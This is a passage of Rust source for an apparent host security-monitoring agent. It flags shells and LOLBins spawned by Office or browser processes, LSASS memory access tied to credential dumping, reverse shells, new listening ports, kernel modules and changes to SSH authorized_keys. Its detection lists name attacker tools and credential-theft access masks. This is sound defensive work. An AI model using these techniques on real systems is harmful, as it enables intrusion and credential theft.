    "acrord32.exe",
    "acrobat.exe",
];

/// Command interpreters proper.
#[cfg(any(windows, test))]
const ANCESTRY_SHELL_CHILDREN: &[&str] = &["cmd.exe", "powershell.exe", "pwsh.exe"];

/// Script hosts and proxy-execution LOLBins (shells included -- a document
/// process launching any of these is suspicious).
#[cfg(any(windows, test))]
const ANCESTRY_LOLBIN_CHILDREN: &[&str] = &[
    "cmd.exe",
    "powershell.exe",
    "pwsh.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "bitsadmin.exe",
    "certutil.exe",
];

/// Service hosts whose spawning of an interactive shell is a lateral-movement /
/// living-off-the-land signal (WMI remote exec; a service launching cmd).
#[cfg(any(windows, test))]
const ANCESTRY_SERVICE_PARENTS: &[&str] = &["wmiprvse.exe", "services.exe"];

/// Classifies one parent->child process chain, returning a static finding label
/// when it's suspicious. Case-insensitive on the image basenames.
#[cfg(any(windows, test))]
fn ancestry_label(parent: &str, child: &str) -> Option<&'static str> {
    let parent = parent.to_ascii_lowercase();
    let child = child.to_ascii_lowercase();
    let has = |set: &[&str], v: &str| set.contains(&v);
    if has(ANCESTRY_DOC_PARENTS, &parent) && has(ANCESTRY_SHELL_CHILDREN, &child) {
        return Some("Office application spawned a command interpreter");
    }
    if has(ANCESTRY_DOC_PARENTS, &parent) && has(ANCESTRY_LOLBIN_CHILDREN, &child) {
        return Some("Script host or LOLBin spawned by an office/browser process");
    }
    if has(ANCESTRY_SERVICE_PARENTS, &parent) && has(ANCESTRY_SHELL_CHILDREN, &child) {
        return Some("Command shell spawned by a long-running service host");
    }
    None
}

/// Collapses whitespace/tabs and bounds a detail string so it can't break the
/// tab-delimited wire format or bloat a finding.
#[cfg(any(windows, test))]
fn sanitize_detail(s: &str, max: usize) -> String {
    let cleaned = s.trim().replace(['\t', '\n', '\r'], " ");
    if cleaned.chars().count() <= max {
        cleaned
    } else {
        let truncated: String = cleaned.chars().take(max).collect();
        format!("{truncated}...")
    }
}

/// Builds process-ancestry findings from a `(pid, parent_pid, name, cmdline)`
/// snapshot. Looks each process's parent up by pid, and for a suspicious chain
/// emits a complete `high\t<label>\tprocess-ancestry\t<detail>` wire line
/// naming the chain. De-duplicated by (parent, child) basename so a burst of
/// identical chains collapses to one line.
#[cfg(any(windows, test))]
fn ancestry_findings(snapshot: &[(u32, u32, String, String)]) -> Vec<String> {
    use std::collections::{HashMap, HashSet};
    let name_by_pid: HashMap<u32, &str> = snapshot
        .iter()
        .map(|(pid, _, name, _)| (*pid, name.as_str()))
        .collect();
    let mut seen: HashSet<(String, String)> = HashSet::new();
    let mut out = Vec::new();
    for (_pid, ppid, name, cmdline) in snapshot {
        let Some(parent_name) = name_by_pid.get(ppid).copied() else {
            continue;
        };
        if let Some(label) = ancestry_label(parent_name, name) {
            let key = (parent_name.to_ascii_lowercase(), name.to_ascii_lowercase());
            if !seen.insert(key) {
                continue;
            }
            let cmd = sanitize_detail(cmdline, 200);
            out.push(format!(
                "high\t{label}\tprocess-ancestry\tparent={parent_name} child={name} cmd={cmd}"
            ));
        }
    }
    out
}

// ---- LSASS access (Sysmon 10, M1) -----------------------------------------

/// Sysmon ProcessAccess `GrantedAccess` masks associated with reading another
/// process's memory (credential dumping against lsass): `PROCESS_VM_READ` and
/// the broad all-access masks. A handle opened without these (e.g. a mere
/// `PROCESS_QUERY_LIMITED_INFORMATION`) is ordinary and not flagged.
#[cfg(any(windows, test))]
const LSASS_SUSPICIOUS_ACCESS: &[&str] = &[
    "0x1010", "0x1410", "0x1438", "0x143a", "0x1fffff", "0x1f1fff", "0x1f2fff", "0x1f3fff",
];

/// Builds a finding for one Sysmon-10 access to lsass, or `None` when the
/// target isn't lsass or the granted access isn't memory-reading. Pure/testable.
#[cfg(any(windows, test))]
fn lsass_access_finding(
    source_image: &str,
    target_image: &str,
    granted_access: &str,
) -> Option<String> {
    let target = target_image.to_ascii_lowercase();
    if !target.ends_with("\\lsass.exe") && target != "lsass.exe" {
        return None;
    }
    let access = granted_access.trim().to_ascii_lowercase();
    if !LSASS_SUSPICIOUS_ACCESS.contains(&access.as_str()) {
        return None;
    }
    let source = sanitize_detail(source_image, 200);
    Some(format!(
        "high\tPossible LSASS memory access (credential theft)\tsysmon\tsource={source} target={target_image} access={granted_access}"
    ))
}

/// Queries Sysmon for ProcessAccess (event 10) handles opened against lsass
/// with a memory-reading access mask -- the on-host credential-dumping signal.
/// Best-effort: returns an empty vec if Sysmon isn't installed or the query
/// fails. Most Sysmon configs already scope ProcessAccess logging to lsass, so
/// the recent-window read stays cheap; the control plane dedups re-reads by
/// content hash (the RecordId is included so distinct accesses stay distinct).
#[cfg(windows)]
async fn windows_lsass_access_findings() -> Vec<String> {
    // Pull the EventData fields we need (SourceImage/TargetImage/GrantedAccess)
    // plus the RecordId, tab-joined, and classify in Rust so the mask/target
    // logic lives in one tested place.
    let script = "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=10} \
         -MaxEvents 1000 -ErrorAction SilentlyContinue | ForEach-Object { \
         $x = [xml]$_.ToXml(); $d = @{}; \
         $x.Event.EventData.Data | ForEach-Object { $d[$_.Name] = $_.'#text' }; \
         \"$($_.RecordId)`t$($d['SourceImage'])`t$($d['TargetImage'])`t$($d['GrantedAccess'])\" }";
    let mut out = Vec::new();
    if let Ok(output) = crate::process::run_command(
        "powershell.exe",
        &["-NoProfile", "-NonInteractive", "-Command", script],
    )
    .await
    {
        for line in output.stdout.lines() {
            let mut parts = line.splitn(4, '\t');
            let (Some(rid), Some(source), Some(target), Some(access)) =
                (parts.next(), parts.next(), parts.next(), parts.next())
            else {
                continue;
            };
            if let Some(finding) = lsass_access_finding(source, target, access) {
                // Append the RecordId so repeated accesses stay distinct rows
                // while a re-read of the same event dedups by content hash.
                out.push(format!("{finding} rid={}", rid.trim()));
            }
        }
    }
    out
}

/// Extracts the port from a `ss`/`netstat` listing line's local-address
/// field (both put it at the same whitespace-split index once `netstat`'s
/// two-line header is filtered out by the caller) -- `rsplit(':')` rather
/// than `split(':')` so an IPv6 local address (`[::]:22`, itself
/// colon-heavy) still yields just the trailing port.
#[cfg(unix)]
fn parse_listening_port(line: &str, field_index: usize) -> Option<&str> {
    line.split_whitespace().nth(field_index)?.rsplit(':').next()
}

/// Current TCP/UDP listening ports, normalized to `"tcp:<port>"`/
/// `"udp:<port>"` (the same `port_key` shape the Windows implementation
/// below produces, so the control-plane baseline table doesn't need to
/// know which platform a key came from). Prefers `ss` (iproute2, present
/// on essentially every modern distro); falls back to `netstat` for
/// older systems, matching `firewall.rs`'s own "detect the tool present"
/// convention. Best-effort throughout -- a missing/failed tool just
/// means no port findings this scan, not a scan failure.
#[cfg(unix)]
async fn linux_listening_ports(elevation: &ElevationState) -> Vec<String> {
    let mut ports = Vec::new();
    if command_exists("ss").await {
        for (proto, flag) in [("tcp", "-tlnH"), ("udp", "-ulnH")] {
            if let Ok(output) = elevation.run_allow_failure("ss", &[flag]).await
                && output.exit_code == Some(0)
            {
                for line in output.stdout.lines() {
                    if let Some(port) = parse_listening_port(line, 3) {
                        ports.push(format!("{proto}:{port}"));
                    }
                }
            }
        }
    } else {
        for (proto, flag) in [("tcp", "-tln"), ("udp", "-uln")] {
            if let Ok(output) = elevation.run_allow_failure("netstat", &[flag]).await
                && output.exit_code == Some(0)
            {
                for line in output.stdout.lines() {
                    let starts_with_proto = line
                        .trim_start()
                        .get(..proto.len())
                        .is_some_and(|prefix| prefix.eq_ignore_ascii_case(proto));
                    if !starts_with_proto {
                        continue;
                    }
                    if let Some(port) = parse_listening_port(line, 3) {
                        ports.push(format!("{proto}:{port}"));
                    }
                }
            }
        }
    }
    ports.sort();
    ports.dedup();
    ports
}

/// Splits a `ss`/`netstat` remote-address field (`"203.0.113.9:4444"`,
/// or a bracketed IPv6 form like `"[2001:db8::1]:4444"`) into its
/// address and port, at the *last* colon so an unbracketed IPv6 address
/// (itself colon-heavy) still splits correctly. `field_index` is 4 for
/// both tools' established-connection output (`ss -tn state
/// established`'s Peer Address:Port column, and `netstat -tn`'s Foreign
/// Address column -- the same index Phase 7a's `parse_listening_port`
/// used for *local* address on a *listening*-socket line, since that's
/// a structurally different column position).
#[cfg(unix)]
fn parse_remote_addr_port(line: &str, field_index: usize) -> Option<(IpAddr, u16)> {
    let field = line.split_whitespace().nth(field_index)?;
    let port_start = field.rfind(':')?;
    let addr_str = field[..port_start]
        .trim_start_matches('[')
        .trim_end_matches(']');
    let ip: IpAddr = addr_str.parse().ok()?;
    let port: u16 = field[port_start + 1..].parse().ok()?;
    Some((ip, port))
}

#[cfg(unix)]
fn push_outbound_connection_line(lines: &mut Vec<String>, line: &str, field_index: usize) {
    if let Some((ip, port)) = parse_remote_addr_port(line, field_index)
        && !is_private_or_loopback(&ip)
    {
        lines.push(format!("remote_port={port}\tremote_addr={ip}\tproto=tcp"));
    }
}

/// Current established TCP connections to a *non-private, non-loopback*
/// remote address, formatted as `remote_port=<n>\tremote_addr=<ip>\t
/// proto=tcp` lines for `classify()` to match against (Phase 8) -- see
/// `RULES`' own doc comment for why this is a `classify()` source and
/// not a baseline-diff table the way listening ports are. Same "prefer
/// `ss`, fall back to `netstat`" shape as `linux_listening_ports`.
#[cfg(unix)]
async fn linux_outbound_connections(elevation: &ElevationState) -> Vec<String> {
    let mut lines = Vec::new();
    if command_exists("ss").await {
        if let Ok(output) = elevation
            .run_allow_failure("ss", &["-tn", "-H", "state", "established"])
            .await
            && output.exit_code == Some(0)
        {
            for line in output.stdout.lines() {
                push_outbound_connection_line(&mut lines, line, 4);
            }
        }
    } else if let Ok(output) = elevation.run_allow_failure("netstat", &["-tn"]).await
        && output.exit_code == Some(0)
    {
        for line in output.stdout.lines() {
            let lower = line.trim_start().to_ascii_lowercase();
            if !lower.starts_with("tcp") || !lower.contains("established") {
                continue;
            }
            push_outbound_connection_line(&mut lines, line, 4);
        }
    }
    lines
}

/// Currently loaded kernel module names (Phase 9), from `lsmod`'s first
/// whitespace column of every line after its own header row. A newly-
/// loaded module a scan-to-scan comparison hasn't seen before is exactly
/// the kind of rootkit/kernel-level-persistence signal a healthy host's
/// naturally stable module set makes low-noise to alert on -- unlike
/// Phase 8's outbound connections, this genuinely is a baseline-diff
/// case, the same shape as `linux_listening_ports`'s own set-membership
/// tracking (see `thanatos_kernel_module_baseline`'s doc comment
/// control-plane-side for the reconciliation logic).
#[cfg(unix)]
async fn linux_kernel_modules(elevation: &ElevationState) -> Vec<String> {
    let mut modules = Vec::new();
    if let Ok(output) = elevation.run_allow_failure("lsmod", &[]).await
        && output.exit_code == Some(0)
    {
        for line in output.stdout.lines().skip(1) {
            if let Some(name) = line.split_whitespace().next() {
                modules.push(name.to_string());
            }
        }
    }
    modules
}

/// Discovers per-user SSH `authorized_keys` files (Phase 10) -- planting
/// a key there grants login without ever touching a password or
/// sudoers, a classic persistence technique the fixed `FIM_WATCHLIST`
/// above can't cover since the set of users (and therefore paths) isn't
/// fixed the way `/etc/passwd` itself is. Reuses the exact directory set
/// `cryptkeeper.rs`'s `SENSITIVE_SCAN_DIRS` already established for the
/// same "sensitive SSH material lives here" reasoning, just discovering
/// paths to hash (via the same `sha256sum`/`thanatos_file_hashes` path
/// every other FIM entry already goes through, completely unchanged)
/// instead of checking permissions on them. `-maxdepth 3` covers both
/// `/home/<user>/.ssh/authorized_keys` (3 levels below `/home`) and
/// `/root/.ssh/authorized_keys` (2 levels below `/root`, comfortably
/// under the same ceiling).
#[cfg(unix)]
async fn linux_authorized_keys_paths(elevation: &ElevationState) -> Vec<String> {
    let mut paths = Vec::new();
    // Deliberately *not* gated on `exit_code == Some(0)`, unlike most
    // other `run_allow_failure` calls in this file: `find` exits
    // non-zero the moment it hits *any* permission-denied subtree during
    // traversal (near-guaranteed here -- `/home` almost always holds
    // other users' private directories this agent can't read), even
    // though it still printed every match it *could* reach to stdout
    // first. Requiring a clean exit would silently discard real,
    // complete results over one unrelated denied directory -- confirmed
    // live against a real multi-user `/home` during this phase's own
    // verification, not a hypothetical. `cryptkeeper.rs`'s own
    // `find`-based functions (`list_tls_certificates`,
    // `scan_sensitive_file_permissions`) already never check this for
    // exactly the same reason.
    if let Ok(output) = elevation
        .run_allow_failure(
            "find",
            &[
                "/home",
                "/root",
                "-maxdepth",
                "3",
                "-type",
                "f",
                "-name",
                "authorized_keys",
            ],
        )
        .await
    {
        for line in output.stdout.lines() {
            if !line.trim().is_empty() {
                paths.push(line.trim().to_string());
            }
        }
    }
    paths
}

#[cfg(unix)]
pub async fn scan_security_events(
    elevation: &ElevationState,
    extra_fim_paths: Vec<String>,
    // Windows-only: Linux scans by log tail, not Event Log record ids.
    _channel_offsets: Vec<(String, u64)>,
    c2_ports: Vec<u16>,
    fast_only: bool,
) -> CommandOutcome {
    let mut lines_with_source: Vec<(&'static str, String)> = Vec::new();

    // Fast "act-now" sweep (M6 Option A): on Linux the low-latency signal worth
    // catching between full sweeps is a reverse shell / LOLBin in a running
    // process's command line, which is cheap to read. Everything else (auth
    // logs, kernel, FIM, ports, modules) stays on the full sweep.
    if fast_only {
        if let Ok(output) = elevation
            .run_allow_failure("ps", &["-eo", "args", "--no-headers"])
            .await
            && output.exit_code == Some(0)
        {
            for line in output.stdout.lines() {
                if !line.trim().is_empty() {
                    lines_with_source.push(("process", line.to_string()));
                }
            }
        }
        return fast_scan_outcome(&lines_with_source, &c2_ports);
    }

    // ---- Auth/login sources: a flat log file, or journalctl only if
    // neither flat candidate was readable at all. ----
    let mut auth_found = false;
    for (path, source) in LOG_CANDIDATES {
        match elevation
            .run_allow_failure("tail", &["-n", TAIL_LINES, path])
            .await
        {
            Ok(output) if output.exit_code == Some(0) && !output.stdout.trim().is_empty() => {
                auth_found = true;
                for line in output.stdout.lines() {
                    lines_with_source.push((source, line.to_string()));
                }
            }
            _ => {}
        }
    }

    if !auth_found && command_exists("journalctl").await {
        for source in JOURNAL_SOURCES {
            let (flag, value) = match source {
                JournalSource::Unit(u) => ("-u", *u),
                JournalSource::Identifier(i) => ("-t", *i),
            };
            match elevation
                .run_allow_failure(
                    "journalctl",
                    &[flag, value, "-n", JOURNAL_LINES, "--no-pager", "-o", "cat"],
                )
                .await
            {
                Ok(output) if output.exit_code == Some(0) => {
                    for line in output.stdout.lines() {
                        if !line.trim().is_empty() {
                            lines_with_source.push(("journal", line.to_string()));
                        }
                    }
                }
                _ => {}
            }
        }
    }

    // ---- Kernel ring buffer: independent of the auth sources above --
    // OOM-kills/hardware errors/segfault bursts aren't auth-related, so
    // this is gathered regardless of whether `auth_found` came up empty.
    // Same "flat file first, journal/dmesg fallback" shape. A permission
    // failure here (e.g. `kernel.dmesg_restrict=1` and no elevation)
    // still returns `Ok` with the error text as stdout -- harmless, since
    // `classify` below only ever emits lines that actually match a rule,
    // never surfaces raw command output verbatim the way a read-only
    // display arsenal does.
    let mut kernel_found = false;
    for (path, source) in KERNEL_LOG_CANDIDATES {
        match elevation
            .run_allow_failure("tail", &["-n", TAIL_LINES, path])
            .await
        {
            Ok(output) if output.exit_code == Some(0) && !output.stdout.trim().is_empty() => {
                kernel_found = true;
                for line in output.stdout.lines() {
                    lines_with_source.push((source, line.to_string()));
                }
            }
            _ => {}
        }
    }
    if !kernel_found {
        let kernel_output = if command_exists("journalctl").await {
            elevation
                .run_allow_failure(
                    "journalctl",
                    &["-k", "-n", JOURNAL_LINES, "--no-pager", "-o", "cat"],
                )
                .await
        } else {
            elevation.run_allow_failure("dmesg", &["-T"]).await
        };
        if let Ok(output) = kernel_output
            && output.exit_code == Some(0)
        {
            for line in output.stdout.lines() {
                if !line.trim().is_empty() {
                    lines_with_source.push(("kernel", line.to_string()));
                }
            }
        }
    }

    // ---- systemd unit failures: independent of everything above. ----
    if command_exists("systemctl").await
        && let Ok(output) = elevation
            .run_allow_failure("systemctl", &["--failed", "--no-pager", "--no-legend"])
            .await
        && output.exit_code == Some(0)
    {
        for line in output.stdout.lines() {
            if !line.trim().is_empty() {
                lines_with_source.push(("systemd", line.to_string()));
            }
        }
    }

    // ---- Process command lines: independent of everything above --
    // fed through the same classify() pass as every log source (source
    // "process"), not diffed -- see `RULES`'s "Process command-line
    // signals" comment for why. `-eo args` (not `-ef --forest`, which
    // Reanimation's own process listing uses) keeps each line to just
    // the command itself, no tree-drawing characters or extra columns
    // to pollute substring matching.
    if let Ok(output) = elevation
        .run_allow_failure("ps", &["-eo", "args", "--no-headers"])
        .await
        && output.exit_code == Some(0)
    {
        for line in output.stdout.lines() {
            if !line.trim().is_empty() {
                lines_with_source.push(("process", line.to_string()));
            }
        }
    }

    // ---- Established outbound connections to a non-private remote
    // address: independent of everything above -- see
    // `linux_outbound_connections`'s and `RULES`' own doc comments.
    for line in linux_outbound_connections(elevation).await {
        lines_with_source.push(("network-outbound", line));
    }

    let scanned = lines_with_source.len();
    let mut stdout = String::new();
    let mut matched_count = 0usize;
    for (source, line) in &lines_with_source {
        if let Some((severity, label)) = classify_line(source, line, &c2_ports) {
            matched_count += 1;
            stdout.push_str(&format!("{severity}\t{label}\t{source}\t{line}\n"));
        }
    }

    // File-integrity watch-list -- always attempted, independent of
    // whether any log source above was readable at all (hashing a file
    // has nothing to do with log availability). `extra_fim_paths`
    // (Phase 7b) are admin-configured, additive to -- never a
    // replacement for -- the fixed watch-list above; re-validated here
    // even though the control plane already checked them, same "never
    // trusts a wire value" rule every other operation follows.
    let extra_fim_paths: Vec<&str> = extra_fim_paths
        .iter()
        .map(String::as_str)
        .filter(|p| abyssal_agent_protocol::is_valid_absolute_path(p))
        .collect();
    // Per-user SSH `authorized_keys` files (Phase 10) -- discovered
    // fresh every scan rather than fixed, since the set of users isn't;
    // see `linux_authorized_keys_paths`'s own doc comment.
    let authorized_keys_paths = linux_authorized_keys_paths(elevation).await;
    for path in FIM_WATCHLIST
        .iter()
        .copied()
        .chain(extra_fim_paths)
        .chain(authorized_keys_paths.iter().map(String::as_str))
    {
        if let Ok(output) = elevation.run_allow_failure("sha256sum", &[path]).await
            && output.exit_code == Some(0)
            && let Some(hash) = output.stdout.split_whitespace().next()
        {
            stdout.push_str(&format!("fim\t{path}\t{hash}\n"));
        }
    }

    // Listening ports -- always attempted, reported fresh every scan
    // (the control plane does the new-port diffing, same "stateless
    // agent" split FIM already uses; see `thanatos_network_baseline`'s
    // doc comment control-plane-side).
    for port_key in linux_listening_ports(elevation).await {
        stdout.push_str(&format!("port\t{port_key}\n"));
    }

    // Loaded kernel modules -- same "agent reports the full current
    // set, control plane diffs it" split as listening ports; see
    // `linux_kernel_modules`'s own doc comment.
    for module_key in linux_kernel_modules(elevation).await {
        stdout.push_str(&format!("module\t{module_key}\n"));
    }

    if matched_count == 0 {
        let note = if scanned == 0 {
            "No readable security log sources found (checked /var/log/auth.log, \
             /var/log/secure, journalctl for sshd/sudo/systemd-logind, the kernel ring \
             buffer, and systemd unit status)."
                .to_string()
        } else {
            format!("Scanned {scanned} line(s); nothing matched the current detection rules.")
        };
        stdout.push_str(&format!("info\t{note}\n"));
    }

    CommandOutcome::Ok(OperationOutput {
        stdout,
        stderr: String::new(),
        exit_code: Some(0),
    })
}

/// How many events one channel yields per scan when tailing by offset -- a
/// safety ceiling so a pathological burst can't make one scan unbounded (the
/// next scan picks up from the new high-water mark).
const OFFSET_FETCH_CAP: u32 = 1000;
/// First-scan (no offset yet) bounded baseline window per channel.
const BASELINE_FETCH: u32 = 500;

/// Builds the PowerShell for one channel. With a known `offset` (>0) it uses a
/// `FilterXml` query that filters *server-side* by event id AND
/// `EventRecordID > offset`, so only genuinely new events are read (no lost
/// bursts, no re-processing). With no offset (first scan) it takes a bounded
/// recent window as a baseline. Either way it emits the same tab-delimited event
/// lines the classify pass expects, then a final `MAXRID=<n>` line carrying the
/// newest record id seen so the caller can advance the high-water mark. Log
/// names and ids are fixed constants (never wire input), so no escaping/
/// injection concern. Pure so it's unit-tested on every platform; only called
/// from the Windows scan.
#[cfg_attr(not(windows), allow(dead_code))]
fn windows_channel_script(log_name: &str, ids: &[u32], offset: u64) -> String {
    let selector = if offset > 0 {
        let id_clause = ids
            .iter()
            .map(|id| format!("EventID={id}"))
            .collect::<Vec<_>>()
            .join(" or ");
        let xml = format!(
            "<QueryList><Query Id='0' Path='{log_name}'><Select Path='{log_name}'>\
             *[System[({id_clause}) and EventRecordID &gt; {offset}]]</Select></Query></QueryList>"
        );
        format!("-FilterXml \"{xml}\" -MaxEvents {OFFSET_FETCH_CAP}")
    } else {
        let id_list = ids.iter().map(u32::to_string).collect::<Vec<_>>().join(",");
        format!(
            "-FilterHashtable @{{LogName='{log_name}';Id={id_list}}} -MaxEvents {BASELINE_FETCH}"
        )
    };
    // `-replace '\r?\n', ' '` flattens the (often multi-line) Message to one
    // line (the outer wire format is newline-delimited); the 300-char cap keeps
    // a long template from dwarfing the scan. `EventID=$($_.Id)` is the stable,
    // non-localized marker `classify()` matches on. IpAddress/Account are pulled
    // from the raw message so they survive the cap and drive cross-host
    // correlation. A trailing `MAXRID=` line reports the newest record id.
    format!(
        "$events = @(Get-WinEvent {selector} -ErrorAction SilentlyContinue); \
         $events | ForEach-Object {{ \
         $raw = $_.Message; \
         $m = ($raw -replace '\\r?\\n', ' ').Trim(); \
         if ($m.Length -gt 300) {{ $m = $m.Substring(0, 300) }}; \
         $ipm = [regex]::Match($raw, 'Source Network Address:\\s+(\\S+)'); \
         $ip = if ($ipm.Success -and $ipm.Groups[1].Value -ne '-') {{ $ipm.Groups[1].Value }} else {{ '' }}; \
         $accts = [regex]::Matches($raw, 'Account Name:\\s+(\\S+)') | ForEach-Object {{ $_.Groups[1].Value }} | Where-Object {{ $_ -ne '-' }}; \
         $acct = if ($accts) {{ @($accts)[-1] }} else {{ '' }}; \
         \"EventID=$($_.Id)`tTime=$($_.TimeCreated.ToString('o'))`tIpAddress=$ip`tAccount=$acct`t$m\" }}; \
         if ($events.Count -gt 0) {{ \"MAXRID=\" + (($events | Measure-Object -Property RecordId -Maximum).Maximum) }}"
    )
}

/// Curated high-signal, low-volume Event Log channels/IDs the fast "act-now"
/// sweep reads (M6 Option A). Deliberately small: 1102 (log cleared), 4719
/// (audit policy changed), 4648 (explicit-credential/lateral logon), 4688
/// (process creation -- the LOLBin/ransomware command-line rules fire on it),
/// Sysmon 1/8/25 (process create / injection / tampering), and Defender
/// 1116/5001 (malware / real-time protection off). Everything else -- posture,
/// FIM, ports, LSASS, ancestry, outbound -- stays on the full sweep.
#[cfg(windows)]
const WINDOWS_FAST_CHANNELS: &[(&str, &str, &[u32])] = &[
    ("Security", "security", &[1102, 4719, 4648, 4688]),
    (
        "Microsoft-Windows-Sysmon/Operational",
        "sysmon",
        &[1, 8, 25],
    ),
    (
        "Microsoft-Windows-Windows Defender/Operational",
        "defender",
        &[1116, 5001],
    ),
];

/// How many recent events the fast sweep reads per channel. Small, because it
/// runs every few seconds; overlap with the previous tick and with the full
/// sweep is collapsed by content-hash dedup control-plane-side.
const FAST_FETCH: u32 = 50;

/// Fast-sweep channel query (M6 Option A): the curated IDs over a small recent
/// window, with **no** `EventRecordID` offset filter and **no** `MAXRID` line.
/// The fast sweep is a best-effort low-latency pass and deliberately does not
/// advance the full sweep's per-channel high-water marks -- that stays the
/// complete source of truth. Emits the same tab-delimited event lines the
/// classify pass expects. Log names/ids are fixed constants (never wire input),
/// so no escaping concern. Pure, so it's unit-tested on every platform; only
/// called from the Windows fast path.
#[cfg_attr(not(windows), allow(dead_code))]
fn windows_fast_channel_script(log_name: &str, ids: &[u32]) -> String {
    let id_list = ids.iter().map(u32::to_string).collect::<Vec<_>>().join(",");
    format!(
        "Get-WinEvent -FilterHashtable @{{LogName='{log_name}';Id={id_list}}} -MaxEvents {FAST_FETCH} -ErrorAction SilentlyContinue | ForEach-Object {{ \
         $raw = $_.Message; \
         $m = ($raw -replace '\\r?\\n', ' ').Trim(); \
         if ($m.Length -gt 300) {{ $m = $m.Substring(0, 300) }}; \
         $ipm = [regex]::Match($raw, 'Source Network Address:\\s+(\\S+)'); \
         $ip = if ($ipm.Success -and $ipm.Groups[1].Value -ne '-') {{ $ipm.Groups[1].Value }} else {{ '' }}; \
         $accts = [regex]::Matches($raw, 'Account Name:\\s+(\\S+)') | ForEach-Object {{ $_.Groups[1].Value }} | Where-Object {{ $_ -ne '-' }}; \
         $acct = if ($accts) {{ @($accts)[-1] }} else {{ '' }}; \
         \"EventID=$($_.Id)`tTime=$($_.TimeCreated.ToString('o'))`tIpAddress=$ip`tAccount=$acct`t$m\" }}"
    )
}

/// Classifies a fast-sweep's gathered lines and wraps them as a scan outcome --
/// the same classify-and-emit pass the full sweep runs, and nothing else (M6
/// Option A). No `info` line: the fast sweep runs every few seconds, so a
/// "nothing matched" note every tick would be pure noise; the full sweep
/// already reports scan health. Shared by both platforms' fast path.
fn fast_scan_outcome(
    lines_with_source: &[(&'static str, String)],
    c2_ports: &[u16],
) -> CommandOutcome {
    let mut stdout = String::new();
    for (source, line) in lines_with_source {
        if let Some((severity, label)) = classify_line(source, line, c2_ports) {
            stdout.push_str(&format!("{severity}\t{label}\t{source}\t{line}\n"));
        }
    }
    CommandOutcome::Ok(OperationOutput {
        stdout,
        stderr: String::new(),
        exit_code: Some(0),
    })
}

/// Windows equivalent of the Unix `scan_security_events` above -- same
/// wire format, same classify()/RULES pass, different gathering. Reads
/// via `Get-WinEvent` (shelled out through `powershell.exe`) rather than
/// the raw Win32 EventLog API: this agent has no Windows machine in its
/// own test/CI loop to verify unsafe FFI against, and every other
/// platform-specific data source in this crate already goes through a
/// CLI tool and text parsing rather than a native API, so this keeps
/// that same, independently-verifiable shape. `_elevation` is unused --
/// unlike Linux's sudo-gated reads, the service always runs as
/// `LocalSystem` (see `crates/agent/src/winservice.rs`), which already
/// has full Event Log read access.
#[cfg(windows)]
pub async fn scan_security_events(
    _elevation: &ElevationState,
    extra_fim_paths: Vec<String>,
    channel_offsets: Vec<(String, u64)>,
    c2_ports: Vec<u16>,
    fast_only: bool,
) -> CommandOutcome {
    use std::collections::HashMap;

    // Fast "act-now" sweep (M6 Option A): only the curated high-signal Event Log
    // IDs over a small recent window, no offset tracking (so it never touches
    // the full sweep's high-water marks) and no FIM/posture/ports/ancestry/LSASS
    // query. Cheap enough to run every few seconds; the full 60s sweep stays the
    // complete, offset-tracked source of truth, and content-hash dedup collapses
    // the overlap.
    if fast_only {
        let mut fast_lines: Vec<(&'static str, String)> = Vec::new();
        for &(log_name, source, ids) in WINDOWS_FAST_CHANNELS {
            let script = windows_fast_channel_script(log_name, ids);
            if let Ok(output) = crate::process::run_command(
                "powershell.exe",
                &["-NoProfile", "-NonInteractive", "-Command", &script],
            )
            .await
            {
                for line in output.stdout.lines() {
                    if !line.trim().is_empty() {
                        fast_lines.push((source, line.to_string()));
                    }
                }
            }
        }
        return fast_scan_outcome(&fast_lines, &c2_ports);
    }

    let offsets: HashMap<&str, u64> = channel_offsets
        .iter()
        .map(|(k, v)| (k.as_str(), *v))
        .collect();

    let mut lines_with_source: Vec<(&'static str, String)> = Vec::new();
    // (source, new high-water record id) to report back so the control plane
    // advances this host's offsets.
    let mut new_offsets: Vec<(&'static str, u64)> = Vec::new();
    // Already-classified findings determined directly (process ancestry, LSASS
    // access), not via the `classify()` substring pass -- each is a complete
    // `severity\tlabel\tsource\tdetail` wire line, appended to `stdout` after
    // the classify loop the same way posture/Defender/unquoted-path findings are.
    let mut direct_findings: Vec<String> = Vec::new();

    let mut channels: Vec<(&'static str, &'static str, &'static [u32])> = vec![
        ("Security", "security", WINDOWS_SECURITY_EVENT_IDS),
        ("System", "system", WINDOWS_SYSTEM_EVENT_IDS),
    ];
    channels.extend(
        WINDOWS_EXTRA_CHANNELS
            .iter()
            .map(|(log_name, source, ids)| (*log_name, *source, *ids)),
    );

    for (log_name, source, ids) in channels {
        // Offset keyed by `source` (unique per query), not `log_name` -- two
        // queries can target the same log with different id sets.
        let offset = offsets.get(source).copied().unwrap_or(0);
        let script = windows_channel_script(log_name, ids, offset);
        if let Ok(output) = crate::process::run_command(
            "powershell.exe",
            &["-NoProfile", "-NonInteractive", "-Command", &script],
        )
        .await
        {
            for line in output.stdout.lines() {
                let trimmed = line.trim();
                if trimmed.is_empty() {
                    continue;
                }
                // The script's final line reports the newest record id it saw so
                // the control plane can advance this channel's high-water mark.
                if let Some(rid) = trimmed.strip_prefix("MAXRID=") {
                    if let Ok(n) = rid.trim().parse::<u64>() {
                        new_offsets.push((source, n));
                    }
                } else {
                    lines_with_source.push((source, line.to_string()));
                }
            }
        }
    }

    // Process snapshot -- one `Win32_Process` query serving two purposes
    // (M1): every command line goes through the same classify() pass as the
    // event-log sources (source "process", unchanged behaviour), and the
    // pid/parent-pid/name tuples feed the process-ancestry check below. `|`
    // field separator (a character a Windows image path or command line never
    // contains) keeps parsing unambiguous; a missing command line prints empty.
    let process_script = "Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | \
         ForEach-Object { \"$($_.ProcessId)|$($_.ParentProcessId)|$($_.Name)|$($_.CommandLine)\" }";
    let mut proc_snapshot: Vec<(u32, u32, String, String)> = Vec::new();
    if let Ok(output) = crate::process::run_command(
        "powershell.exe",
        &["-NoProfile", "-NonInteractive", "-Command", process_script],
    )
    .await
    {
        for line in output.stdout.lines() {
            let mut parts = line.splitn(4, '|');
            let (Some(pid), Some(ppid), Some(name), cmdline) = (
                parts.next(),
                parts.next(),
                parts.next(),
                parts.next().unwrap_or(""),
            ) else {
                continue;
            };
            if !cmdline.trim().is_empty() {
                lines_with_source.push(("process", cmdline.to_string()));
            }
            if let (Ok(pid), Ok(ppid)) = (pid.trim().parse::<u32>(), ppid.trim().parse::<u32>()) {
